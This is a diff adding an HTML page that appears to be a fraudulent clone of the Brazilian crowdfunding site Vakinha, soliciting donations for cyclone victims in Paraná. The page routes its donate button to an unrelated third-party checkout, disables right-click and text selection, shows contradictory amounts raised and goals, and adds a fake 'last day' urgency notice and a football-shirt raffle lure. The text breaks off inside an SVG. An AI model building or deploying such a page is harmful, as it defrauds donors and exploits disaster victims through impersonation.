@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Salve vidas através da sua bondade | Vaquinhas Online</title>
+    <meta name="description">
+    <meta name="keywords">
+    <meta name="author" content="Vakinha Online">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+    <meta name="msapplication-navbutton-color" content="#FFFFFF">
+    <meta property="og:title">
+    <meta property="og:description">
+    <meta property="og:url" content="#">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="images/img1.webp">
+    <link rel="shortcut icon" href="https://doe-com-esperanca.com/bruno/images/favicon.ico">
+    <link rel="shortcut icon" href="https://doe-com-esperanca.com/bruno/images/favicon.ico">
+    <link rel="icon" href="https://doe-com-esperanca.com/bruno/images/favicon.ico" sizes="32x32">
+    <link rel="icon" href="https://doe-com-esperanca.com/bruno/images/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" href="https://doe-com-esperanca.com/bruno/images/favicon.ico">
+    <meta name="msapplication-TileImage" content="images/favicon.ico">
+    <link rel="stylesheet" href="files/swiper-bundle.min.css">
+    <link href="files/bootstrap.min.css" rel="stylesheet">
+    <link href="files/style.css" rel="stylesheet">
+
+<style>
+  .svg-container {
+    display: flex;
+    justify-content: center; /* centraliza na horizontal */
+    align-items: center;     /* centraliza na vertical */
+       background-color: #d3fac3;
+    margin-top: -15px;
+  }
+</style>
+
+<script>
+	function getUrlParams() {
+		const params = new URLSearchParams(window.location.search);
+		let paramsObject = {};
+		params.forEach((value, key) => {
+			paramsObject[key] = value;
+		});
+		return paramsObject;
+	}
+
+	function redirectWithParams(baseUrl) {
+		const params = getUrlParams();
+		const url = new URL(baseUrl, window.location);
+
+		Object.keys(params).forEach(key => {
+			url.searchParams.set(key, params[key]);
+		});
+
+		window.location.href = url.toString();
+	}
+</script>
+
+<script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+</script>
+
+<body onmousedown="return false" onselectstart="return false">
+    
+    <!-- Banner de anúncio -->
+    <div id="announcement-banner" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px 20px; position: relative; display: flex; align-items: center; justify-content: center; text-align: center; font-family: 'Inter', sans-serif;">
+        <div style="display: flex; align-items: center; gap: 12px; max-width: 600px; margin: 0 auto;">
+            <div style="flex-shrink: 0;">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                    <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12L8.1 13h7.45c.75 0 1.41-.41 1.75-1.03L21.7 4H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
+                </svg>
+            </div>
+            <div style="flex: 1; line-height: 1.4;">
+                <span style="font-size: 14px; font-weight: 500;">
+                    Leilão do Vakinha: Você pode ganhar uma camisa<br>
+                    oficial do Palmeiras autografada! 
+                    <a href="#" onclick="redirectWithParams('./contribuir')" style="color: white; text-decoration: underline; font-weight: 600;">Doe agora</a>
+                </span>
+            </div>
+        </div>
+        <button onclick="closeAnnouncement()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; color: white; cursor: pointer; padding: 5px; font-size: 18px; opacity: 0.8; transition: opacity 0.3s;" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='0.8'">
+            ×
+        </button>
+    </div>
+
+    <script>
+    function closeAnnouncement() {
+        const banner = document.getElementById('announcement-banner');
+        banner.style.display = 'none';
+    }
+    </script>
+
+    <!-- Pixel Facebook unificado - removido pixel duplicado -->
+<script src="files/confetti.browser.min.js.transferir"></script></head>
+
+<body>
+    <header>
+        <div class="container">
+            <div class="content-header d-flex align-items-center justify-content-between">
+                <div class="logo">
+                    <a href="#"><img src="files/logo.svg" alt="Vakinha Online"></a>
+                </div>
+                <div class="menu-header d-none d-lg-flex d-xl-flex align-items-center">
+                    <div class="item-menu"><span>Como ajudar</span><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium sc-252fa7a3-14 ixtrj css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardArrowDownIcon" width="24" height="24">
+                            <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path>
+                        </svg></div>
+                    <div class="item-menu"><span>Descubra</span><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium sc-252fa7a3-14 ixtrj css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardArrowDownIcon" width="24" height="24">
+                            <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path>
+                        </svg></div>
+                    <div class="item-menu"><span>Como funciona</span><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium sc-252fa7a3-14 ixtrj css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardArrowDownIcon" width="24" height="24">
+                            <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path>
+                        </svg></div>
+                    <div class="logArea d-flex align-items-center justify-content-end">
+                        <div class="item-menu-busca">
+                            <span>Buscar</span>
+                            <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium sc-252fa7a3-15 iZaOBt css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SearchRoundedIcon">
+                                <path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14">
+                                </path>
+                            </svg>
+                        </div>
+                        <div class="item-menu-account"><span>Minha conta</span></div>
+                        <div class="btn-create">
+                            <button type="button" class="btn-create-button">Criar vaquinha</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="menu-mobile d-flex d-lg-none d-xl-none align-items-center">
+                    <div class="busca-mobile"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SearchIcon">
+                            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14">
+                            </path>
+                        </svg></div>
+                    <button class="menu-mobile">
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium sc-c5ec013-3 bQLvwO bm-icon css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="NotesIcon" style="width: 100%; height: 100%;">
+                            <path d="M3 18h12v-2H3zM3 6v2h18V6zm0 7h18v-2H3z"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+    <section id="corpo">
+        <div class="container">
+            <div class="topVakinha">
+                <span>DESASTRE / AMBIENTAL
+
+</span>
+                <h1>HÁ FAMÍLIAS QUE PERDERAM TUDO NESTE CICLONE — MAS NÃO PERDERAM A ESPERANÇA. SUA DOAÇÃO É O PRIMEIRO PASSO PARA UM NOVO COMEÇO NO PARANÁ.</h1>
+                <span>ID: 5487629</span>
+            </div>
+            <div class="detailsVakinha d-flex flex-wrap">
+                <div class="detalhes">
+                    <div class="detalhes-view">
+                        <div class="galeria swiper-initialized swiper-horizontal swiper-backface-hidden">
+
+                            <div class="swiper-wrapper" id="swiper-wrapper-037a5b69d638ab84" aria-live="off">
+                                <div class="image swiper-slide swiper-slide-active swiper-slide-next" role="group" aria-label="1 / 1" data-swiper-slide-index="0" style="width: 700px;"><img src="files/imgi_1_futebol-camiseta.png"></div>
+                            </div>
+                            <div class="galeria-pagination swiper-pagination-bullets swiper-pagination-horizontal swiper-pagination-lock"><span class="swiper-pagination-bullet swiper-pagination-bullet-active" aria-current="true"></span></div>
+                        <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
+                        <div class="sc-jXbUNg jeWFMw">
+                            <ul class="sc-46fe23d1-0 haSOVG">
+                                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt" src="files/avs.svg"></li>
+                                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt" src="files/logo.svg"></li>
+                                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt" src="files/imm.svg"></li>
+                                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt" src="files/lo.webp"></li>
+                                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt" src="files/kc.webp"></li>
+                                <li class="sc-46fe23d1-1 gNSeDc">
+                                    <section class="sc-46fe23d1-3 jLFjnt">+</section>
+                                </li>
+                            </ul>
+                            <div class="sc-jXbUNg kaMzRM">
+                                <span class="sc-fqkvVR ivmFdA"><span id="coracoes">278</span> corações recebidos</span>
+                                <div class="sc-jXbUNg iVMVsL">
+                                    <svg id="___SVG_ID__1__31___" data-name="Grupo 1248" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 18.319 15.34">
+                                        <defs>
+                                            <radialgradient id="___SVG_ID__1__0___" cx="0.298" cy="0.5" r="1.023" gradientTransform="matrix(0.853, 0, 0, -1, 0.003, 2)" gradientUnits="objectBoundingBox">
+                                                <stop offset="0" stop-color="#24ca68"></stop>
+                                                <stop offset="0.704" stop-color="#0a8f51"></stop>
+                                                <stop offset="1" stop-color="#007a48"></stop>
+                                            </radialgradient>
+                                            <clippath id="___SVG_ID__1__2___">
+                                                <rect id="___SVG_ID__1__1___" data-name="Retângulo 417" width="3.582" height="2.246" fill="#fff"></rect>
+                                            </clippath>
+                                            <clippath id="___SVG_ID__1__4___">
+                                                <path id="___SVG_ID__1__3___" data-name="Caminho 602" d="M13.13,1.456A3.588,3.588,0,0,0,10.768,3.11c-.126.207-.156.412-.086.5s.228.044.461-.078c.341-.18.873-.5,1.368-.75a6.142,6.142,0,0,1,1.03-.419c.953-.257,1-1.187-.41-.9" transform="translate(-10.645 -1.403)" fill="#fff" clip-rule="evenodd"></path>
+                                            </clippath>
+                                            <clippath id="___SVG_ID__1__6___">
+                                                <rect id="___SVG_ID__1__5___" data-name="Retângulo 419" width="4.227" height="4.294" fill="#fff"></rect>
+                                            </clippath>
+                                            <clippath id="___SVG_ID__1__8___">
+                                                <path id="___SVG_ID__1__7___" data-name="Caminho 603" d="M3.39,1.333A2.985,2.985,0,0,0,1.17,3.154a.537.537,0,0,0,.02.545c.092.088.26.05.489-.086.334-.2.847-.551,1.333-.825a5.4,5.4,0,0,1,1.037-.46c.989-.283.831-1.307-.658-1M.461,4.7c-.072.406.149,1.22.514.7A2.914,2.914,0,0,0,1.3,4.753a.582.582,0,0,0-.167-.631c-.421-.271-.625.3-.675.579" transform="translate(-0.447 -1.275)" fill="#fff" clip-rule="evenodd"></path>
+                                            </clippath>
+                                            <clippath id="___SVG_ID__1__10___">
+                                                <rect id="___SVG_ID__1__9___" data-name="Retângulo 415" width="8.687" height="4.274"></rect>
+                                            </clippath>
+                                            <clippath id="___SVG_ID__1__12___">
+                                                <path id="___SVG_ID__1__11___" data-name="Caminho 601" d="M7.878,4.086a16.6,16.6,0,0,1,1.362-1.9A5.646,5.646,0,0,0,3.255.242a4.376,4.376,0,0,0-2.7,2.514C2.37-.562,7.8.568,7.635,3.414a3.858,3.858,0,0,1-.05.519c-.038.194-.045.3.027.334s.178-.03.265-.18" transform="translate(-0.553 0)" clip-rule="evenodd"></path>
+                                            </clippath>
+                                        </defs>
+                                        <path id="___SVG_ID__1__13___" data-name="Caminho 597" d="M9.16,2.184A5.647,5.647,0,0,0,3.174.242C.695,1.027-.329,3.754.092,6.165c.667,3.826,4.845,7.644,8.459,9.055a1.678,1.678,0,0,0,.6.12h.032a1.633,1.633,0,0,0,.59-.12c3.649-1.445,7.792-5.229,8.46-9.055a6.259,6.259,0,0,0,.091-1.012V5.048A4.864,4.864,0,0,0,15.145.242,5.119,5.119,0,0,0,13.6,0,5.855,5.855,0,0,0,9.16,2.184" transform="translate(0 0)" fill="url(#___SVG_ID__1__0___)"></path>
+                                        <g id="___SVG_ID__1__19___" data-name="Grupo 930" transform="translate(9.891 1.103)" opacity="0.28" style="isolation: isolate;">
+                                            <g id="___SVG_ID__1__18___" data-name="Grupo 915">
+                                                <g id="___SVG_ID__1__17___" data-name="Grupo 914" clip-path="url(#___SVG_ID__1__2___)">
+                                                    <g id="___SVG_ID__1__16___" data-name="Grupo 913" transform="translate(0 0)">
+                                                        <g id="___SVG_ID__1__15___" data-name="Grupo 912" clip-path="url(#___SVG_ID__1__4___)">
+                                                            <rect id="___SVG_ID__1__14___" data-name="Retângulo 416" width="3.93" height="2.512" transform="translate(-0.033 -0.23)" fill="#fff"></rect>
+                                                        </g>
+                                                    </g>
+                                                </g>
+                                            </g>
+                                        </g>
+                                        <g id="___SVG_ID__1__24___" data-name="Grupo 920" transform="translate(0.584 1.103)" opacity="0.28" style="isolation: isolate;">
+                                            <g id="___SVG_ID__1__23___" data-name="Grupo 919" clip-path="url(#___SVG_ID__1__6___)">
+                                                <g id="___SVG_ID__1__22___" data-name="Grupo 918" transform="translate(0 0)">
+                                                    <g id="___SVG_ID__1__21___" data-name="Grupo 917" clip-path="url(#___SVG_ID__1__8___)">
+                                                        <rect id="___SVG_ID__1__20___" data-name="Retângulo 418" width="4.649" height="4.899" transform="translate(-0.058 -0.253)" fill="#fff"></rect>
+                                                    </g>
+                                                </g>
+                                            </g>
+                                        </g>
+                                        <path id="___SVG_ID__1__25___" data-name="Caminho 608" d="M10.359,1.461C12.487-.128,15.237,1,16.478,2.813a6.087,6.087,0,0,1,.628,5.262c-.919,2.99-4.948,5.935-7.435,6.082-1.9.113-4.081-1.152-6.184-2.808A16.06,16.06,0,0,0,9.062,15.22a1.6,1.6,0,0,0,1.216,0c3.649-1.445,7.792-5.228,8.46-9.055.42-2.411-.6-5.138-3.083-5.924a5.54,5.54,0,0,0-5.3,1.22" transform="translate(-0.511 0)" fill-rule="evenodd" opacity="0.1" style="mix-blend-mode: multiply; isolation: isolate;"></path>
+                                        <g id="___SVG_ID__1__30___" data-name="Grupo 910" transform="translate(0.467 0)" opacity="0.1" style="mix-blend-mode: multiply; isolation: isolate;">
+                                            <g id="___SVG_ID__1__29___" data-name="Grupo 909" clip-path="url(#___SVG_ID__1__10___)">
+                                                <g id="___SVG_ID__1__28___" data-name="Grupo 908" transform="translate(0 0)">
+                                                    <g id="___SVG_ID__1__27___" data-name="Grupo 907" clip-path="url(#___SVG_ID__1__12___)">
+                                                        <rect id="___SVG_ID__1__26___" data-name="Retângulo 414" width="8.688" height="4.87" transform="translate(0 -0.574)">
+                                                        </rect>
+                                                    </g>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="margin-top: 50px;">
+                        <div class="perfil d-flex">
+                            <div class="avatar">
+                                <img src="files/asas.jpg" alt="Asas do Resgate">
+                            </div>
+                            <div class="dadosPerfil">
+                                <h3>Asas do Resgate</h3>
+                                <span class="ativo">Ativo(a) no Vakinha desde abril/2025</span>
+                                <span class="vakinhas">15 vaquinhas criadas <div class="bullet"></div> 7 vaquinha
+                                    apoiada</span>
+                            </div>
+                        </div>
+                        <div class="progresso-mobile d-flex align-items-center">
+                            <div class="porcentagem"><span id="porcentagem">22%</span></div>
+                            <div class="barra">
+                                <div class="barraParcial" id="barraMobile" style="width: 21.8788%;"></div>
+                            </div>
+                        </div>
+                        <div class="arrecadacaoMobile">
+                            <strong id="valorMobile">R$ 12.736,00</strong> de <span>R$ 80.000,00</span>
+                        </div>
+                    </div>
+                    <div class="menu-detalhes">
+                        <ul>
+                            <li class="active">Sobre</li>
+                            <li>Novidades</li>
+                            <li>Quem ajudou</li>
+                        </ul>
+                    </div>
+                    <div class="show-sobre">
+
+<div style="
+    display: flex;
+    padding: 1rem;
+    background-color: #FAE096;
+    border-left: 3px solid #FF5A5A;
+    margin-bottom: 1rem;
+    flex-direction: column;
+"><strong>ATENÇÃO: Último dia para ajudar!</strong><span>A campanha encerra hoje…</span><span>Ainda dá tempo de salvar a vida </span></div>
+                        
+ <div class="show-sobre">
+                        <span class="inicio"><strong>Vaquinha criada em:</strong> 08/07/2025</span>
+                        <!-- Descrição longa -->
+                        <div class="sobre-imagem" style="margin:12px 0;">
+                            <img src="https://i.postimg.cc/nr0v0bvQ/cidade-de-rio-bonito-do-iguacu-ficou-destruida-1762563213680-v2-4x3.png" alt="Imagem sobre a campanha" class="img-fluid" style="max-width:100%; height:auto; border-radius:6px;">
+                        </div>
+                        <div>
+                            <p>HÁ FAMÍLIAS QUE PERDERAM TUDO — MAS NÃO PERDERAM A ESPERANÇA.</p>
+                            <p>Em momentos de dificuldade, cada gesto de solidariedade se transforma em força, alimento e esperança.
+Existem pessoas agora mesmo tentando recomeçar do zero — sem casa, sem recursos, mas com o coração cheio de vontade de seguir em frente.</p>
+                            <p>E é a sua ajuda que pode mudar essa realidade.</p>
+                            <p>Com uma simples doação, você leva abrigo, comida e conforto para quem mais precisa.
+Não se trata apenas de dinheiro — é sobre empatia, compaixão e a vontade de fazer o bem.</p>
+                            <p>Imagine saber que, graças a você, uma família voltou a sorrir.
+Que uma criança dormiu aquecida.
+Que alguém recuperou a esperança porque uma mão se estendeu no momento certo.</p>
+                            <p>💚 A solidariedade é o que reconstrói o que o mundo destrói.</p>
+                            <p>Não espere que outros façam — comece agora.
+Clique no botão abaixo e faça sua parte.
+Cada contribuição, por menor que pareça, é uma semente de recomeço.</p>
+                            <p>✨ DOE. PARTICIPE. AJUDE A RECONSTRUIR VIDAS.</p>
+                        </div>
+                  
+                </div>
+                <div class="resumo">
+                    <div class="sticker-resumo">
+                        <div class="progresso">
+                            <div class="barra-geral">
+                                <div class="barraTotal">
+                                    <div class="barraParcial" id="barra" style="width: 21.8788%;"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="arrecadado">
+                            <span>Arrecadado</span>
+                            <h2 id="doado">R$ 5.503,00</h2>
+                        </div>
+                        <div class="meta">
+                            <span>Meta</span>
+                            <span>R$ 100.000,00</span>
+                        </div>
+                        <div class="apoiadores">
+                            <span>Apoiadores</span>
+                            <span id="apoiadores">289</span>
+                        </div>
+                        
+                        <div class="acao">
+                                <!-- Preservar parâmetros de rastreamento -->
+                                <button type="button" class="btn-ajuda" onclick="redirectWithParams('https://pay.apoiaai.fun/checkout/bhf6m8NXFS')">Quero ajudar</button>
+                        </div>
+                        <div class="perfil d-flex">
+                            <div class="avatar">
+                                <img src="files/Professional%20Profile%20Photo%20kkjuhghjuhyPost%20.png" alt="Vakinha do amor">
+                            </div>
+                            <div class="dadosPerfil">
+                                <h3>Vakinha do amor</h3>
+                                <span class="ativo">Ativo(a) no Vakinha desde abril/2025</span>
+                                <span class="vakinhas">30 vaquinhas criadas <div class="bullet"></div> 15 vaquinhas
+                                    apoiadas</span>
+                                <a href="#">Leia mais</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section id="fixed-mobile" class="d-block d-lg-none d-xl-none" style="background-color: transparent; !important">
+        <div class="svg-container">
+        <svg xmlns="http://www.w3.org/2000/svg" width="130" height="28" fill="none" viewBox="0 0 130 28"><path fill="#EEFFE6" stroke="#009D4E" stroke-width="0.75" d="M122.398 3.375a7.227 7.227 0 0 1 7.227 7.227v6.796a7.227 7.227 0 0 1-7.227 7.227H8.375V3.375z"></path><path fill="#009D4E" d="M14.087.236a.7.7 0 0 1 .748 0l.515.326a.7.7 0 0 0 .636.057l.564-.228a.7.7 0 0 1 .736.133l.449.412a.7.7 0 0 0 .616.17l.596-.123a.7.7 0 0 1 .7.262l.368.486a.7.7 0 0 0 .575.277l.61-.015a.7.7 0 0 1 .641.383l.275.544a.7.7 0 0 0 .517.375l.602.094a.7.7 0 0 1 .563.492l.174.584a.7.7 0 0 0 .441.462l.576.2a.7.7 0 0 1 .466.584l.067.605a.7.7 0 0 0 .352.533l.53.3a.7.7 0 0 1 .354.658l-.042.608a.7.7 0 0 0 .25.587l.47.39a.7.7 0 0 1 .23.71l-.15.59a.7.7 0 0 0 .142.624l.392.466a.7.7 0 0 1 .1.741l-.253.554a.7.7 0 0 0 .029.638l.302.529a.7.7 0 0 1-.034.747l-.348.5a.7.7 0 0 0-.086.633l.203.574a.7.7 0 0 1-.167.73l-.431.429a.7.7 0 0 0-.198.607l.097.602a.7.7 0 0 1-.294.687l-.502.346a.7.7 0 0 0-.302.562l-.012.61a.7.7 0 0 1-.412.624l-.555.25a.7.7 0 0 0-.399.5l-.12.596a.7.7 0 0 1-.517.54l-.591.148a.7.7 0 0 0-.481.42l-.225.566a.7.7 0 0 1-.606.44l-.607.04a.7.7 0 0 0-.549.327l-.322.516a.7.7 0 0 1-.674.325l-.605-.07a.7.7 0 0 0-.598.225l-.41.45a.7.7 0 0 1-.721.2l-.583-.178a.7.7 0 0 0-.628.114l-.484.37a.7.7 0 0 1-.745.068l-.542-.278a.7.7 0 0 0-.638 0l-.542.278a.7.7 0 0 1-.745-.067l-.484-.37a.7.7 0 0 0-.628-.115l-.583.177a.7.7 0 0 1-.721-.199l-.41-.45a.7.7 0 0 0-.598-.225l-.605.07a.7.7 0 0 1-.674-.325l-.322-.516a.7.7 0 0 0-.549-.328l-.608-.04a.7.7 0 0 1-.605-.439l-.225-.566a.7.7 0 0 0-.481-.42l-.59-.147a.7.7 0 0 1-.518-.54l-.12-.598a.7.7 0 0 0-.399-.5l-.555-.25a.7.7 0 0 1-.412-.624l-.012-.609a.7.7 0 0 0-.303-.562l-.501-.346a.7.7 0 0 1-.294-.687l.097-.602a.7.7 0 0 0-.198-.607l-.431-.43a.7.7 0 0 1-.167-.729l.203-.574a.7.7 0 0 0-.086-.633l-.348-.5a.7.7 0 0 1-.034-.747l.302-.529a.7.7 0 0 0 .029-.638l-.253-.554a.7.7 0 0 1 .1-.741l.392-.466a.7.7 0 0 0 .142-.623l-.15-.59a.7.7 0 0 1 .23-.712l.469-.389a.7.7 0 0 0 .251-.587l-.042-.608a.7.7 0 0 1 .354-.658l.53-.3a.7.7 0 0 0 .352-.533l.067-.605a.7.7 0 0 1 .466-.585l.576-.2a.7.7 0 0 0 .441-.461l.174-.584a.7.7 0 0 1 .563-.492l.602-.094a.7.7 0 0 0 .517-.375l.275-.544a.7.7 0 0 1 .642-.383l.608.015a.7.7 0 0 0 .576-.277l.368-.486a.7.7 0 0 1 .7-.262l.596.123a.7.7 0 0 0 .616-.17l.448-.412a.7.7 0 0 1 .736-.133l.565.228a.7.7 0 0 0 .636-.057z"></path><path fill="#025432" stroke="#fff" stroke-width="0.35" d="M14.46 3.675c5.702 0 10.325 4.623 10.325 10.325S20.162 24.325 14.46 24.325 4.135 19.702 4.135 14 8.758 3.675 14.46 3.675Z"></path><path fill="#EEFFE6" d="M14.46 7.583 9.21 9.917v3.5c0 3.237 2.24 6.265 5.25 7 3.01-.735 5.25-3.763 5.25-7v-3.5zm0 6.411h4.084c-.309 2.404-1.913 4.544-4.083 5.215V14h-4.083v-3.325l4.083-1.814z"></path><path fill="#025432" d="M40.24 14.108q0 .636-.211 1.168-.212.532-.596.916a2.7 2.7 0 0 1-.924.596q-.54.212-1.2.212h-2.204v-5.784h2.204q.66 0 1.2.216.54.212.924.596.384.38.596.912t.212 1.168m-1.103 0q0-.476-.128-.852a1.7 1.7 0 0 0-.364-.64 1.55 1.55 0 0 0-.576-.404 2 2 0 0 0-.76-.14h-1.124v4.072h1.124q.424 0 .76-.14.34-.14.576-.4.24-.264.364-.64.128-.38.128-.856m7.97 0q0 .636-.212 1.18-.208.54-.592.936-.384.395-.924.62-.54.22-1.2.22-.656 0-1.196-.22-.54-.224-.928-.62a2.8 2.8 0 0 1-.596-.936 3.2 3.2 0 0 1-.212-1.18q0-.636.212-1.176.212-.544.596-.94.388-.396.928-.616.54-.225 1.196-.224.44 0 .828.104.388.1.712.288.325.184.58.452.26.264.44.592t.272.712q.096.384.096.808m-1.1 0q0-.476-.128-.852a1.8 1.8 0 0 0-.364-.644 1.56 1.56 0 0 0-.576-.404 2 2 0 0 0-.76-.14 2 2 0 0 0-.764.14 1.6 1.6 0 0 0-.576.404q-.236.264-.364.644-.129.376-.128.852 0 .476.128.856.127.376.364.64.24.26.576.4.34.14.764.14t.76-.14q.34-.14.576-.4.236-.264.364-.64.128-.38.128-.856m5.321.708-.704-1.924a4 4 0 0 1-.108-.304 10 10 0 0 1-.112-.38q-.052.204-.108.384-.055.176-.108.308l-.7 1.916zm1.9 2.184h-.832a.36.36 0 0 1-.228-.068.45.45 0 0 1-.132-.176l-.432-1.18h-2.396l-.432 1.18a.4.4 0 0 1-.124.168.35.35 0 0 1-.228.076h-.84l2.276-5.784h1.096zm5.379-.836a2.3 2.3 0 0 1-.768.624q-.452.225-1.068.268l-.052.188q.376.088.528.236a.5.5 0 0 1 .152.36.43.43 0 0 1-.072.244.56.56 0 0 1-.2.184q-.128.076-.308.116t-.396.04q-.165 0-.308-.024a2 2 0 0 1-.28-.064l.092-.308q.024-.092.116-.092a.3.3 0 0 1 .12.028q.067.032.196.032.132 0 .196-.052.068-.048.068-.12 0-.116-.144-.168a3 3 0 0 0-.444-.092l.176-.512a2.8 2.8 0 0 1-1.04-.288 2.5 2.5 0 0 1-.784-.628 2.8 2.8 0 0 1-.496-.904 3.5 3.5 0 0 1-.172-1.124q0-.652.208-1.192.208-.544.584-.936a2.65 2.65 0 0 1 .904-.608q.524-.22 1.16-.22.632 0 1.12.208.492.208.836.544l-.36.5a.3.3 0 0 1-.084.084.22.22 0 0 1-.136.036.3.3 0 0 1-.124-.032 3 3 0 0 1-.14-.084 4 4 0 0 0-.176-.112 1.642 1.642 0 0 0-.54-.192 2 2 0 0 0-.4-.036q-.388 0-.712.14-.32.135-.552.4a1.8 1.8 0 0 0-.36.64q-.128.375-.128.86 0 .488.136.868.14.38.376.64a1.62 1.62 0 0 0 1.244.536q.22 0 .396-.024.18-.024.328-.076.152-.053.284-.132.136-.084.268-.204a.3.3 0 0 1 .084-.056.2.2 0 0 1 .092-.024q.088 0 .156.068zm4.193-1.348-.704-1.924a4 4 0 0 1-.108-.304 10 10 0 0 1-.112-.38q-.052.204-.108.384-.055.176-.108.308l-.7 1.916zM64.7 17h-.832a.36.36 0 0 1-.228-.068.45.45 0 0 1-.132-.176l-.432-1.18H60.68l-.432 1.18a.4.4 0 0 1-.124.168.35.35 0 0 1-.228.076h-.84l2.276-5.784h1.096zm-2.324-6.796q.089 0 .152-.036a.3.3 0 0 0 .108-.088.4.4 0 0 0 .064-.12.5.5 0 0 0 .02-.132h.604q0 .2-.056.384a1 1 0 0 1-.16.324.8.8 0 0 1-.26.224.7.7 0 0 1-.352.084.9.9 0 0 1-.356-.064 3 3 0 0 1-.272-.136l-.228-.14a.4.4 0 0 0-.208-.064.3.3 0 0 0-.156.036.3.3 0 0 0-.104.092.468.468 0 0 0-.08.256h-.612q0-.195.056-.38.055-.188.16-.328a.8.8 0 0 1 .26-.228.7.7 0 0 1 .356-.088q.204 0 .356.064.152.065.272.14l.224.136a.4.4 0 0 0 .212.064m8.667 3.904q0 .636-.212 1.18-.208.54-.592.936-.384.395-.924.62-.54.22-1.2.22-.656 0-1.196-.22-.54-.224-.928-.62a2.8 2.8 0 0 1-.596-.936 3.2 3.2 0 0 1-.212-1.18q0-.636.212-1.176.212-.544.596-.94.387-.396.928-.616.54-.225 1.196-.224.44 0 .828.104.387.1.712.288.325.184.58.452.26.264.44.592t.272.712q.096.384.096.808m-1.1 0q0-.476-.128-.852a1.8 1.8 0 0 0-.364-.644 1.55 1.55 0 0 0-.576-.404 2 2 0 0 0-.76-.14q-.424 0-.764.14a1.6 1.6 0 0 0-.576.404q-.236.264-.364.644-.128.376-.128.852t.128.856q.128.376.364.64.24.26.576.4.34.14.764.14t.76-.14q.34-.14.576-.4.236-.264.364-.64.128-.38.128-.856m6.67.016q.296 0 .516-.072a1 1 0 0 0 .364-.212.9.9 0 0 0 .22-.336q.072-.2.072-.444 0-.232-.072-.42a.8.8 0 0 0-.216-.32.94.94 0 0 0-.364-.2 1.7 1.7 0 0 0-.52-.072h-.804v2.076zm0-2.908a3.3 3.3 0 0 1 1.004.136q.424.135.7.38.276.244.408.584.136.34.136.744 0 .42-.14.772a1.6 1.6 0 0 1-.42.6 1.95 1.95 0 0 1-.704.392q-.42.14-.984.14h-.804V17h-1.076v-5.784zm5.221 2.752q.305 0 .528-.076.228-.075.372-.208a.85.85 0 0 0 .22-.32 1.1 1.1 0 0 0 .072-.404q0-.44-.292-.676-.288-.236-.884-.236h-.688v1.92zM84.602 